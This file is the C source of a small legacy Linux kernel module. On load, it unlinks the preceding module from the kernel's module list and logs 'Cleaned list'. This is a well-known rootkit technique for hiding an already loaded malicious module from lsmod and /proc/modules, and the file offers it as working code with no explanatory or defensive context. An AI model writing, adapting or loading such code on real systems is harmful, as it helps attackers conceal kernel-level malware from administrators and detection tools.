#ifndef __KERNEL__
 #define __KERNEL__
#endif
#ifndef MODULE
 #define MODULE
#endif

#include "includes.h"

#include <linux/init.h>

MODULE_LICENSE("GPL");

EXPORT_NO_SYMBOLS;

int unlink_init(void)
{
	struct module *p = THIS_MODULE;

	p->next = (p->next)->next;

	P_DEBUG("unlink: Cleaned list\n");
	return 0;
}

void unlink_cleanup(void)
{
	P_DEBUG("unlink: Up up and away ;-)\n");
}

module_init(unlink_init);
module_exit(unlink_cleanup);
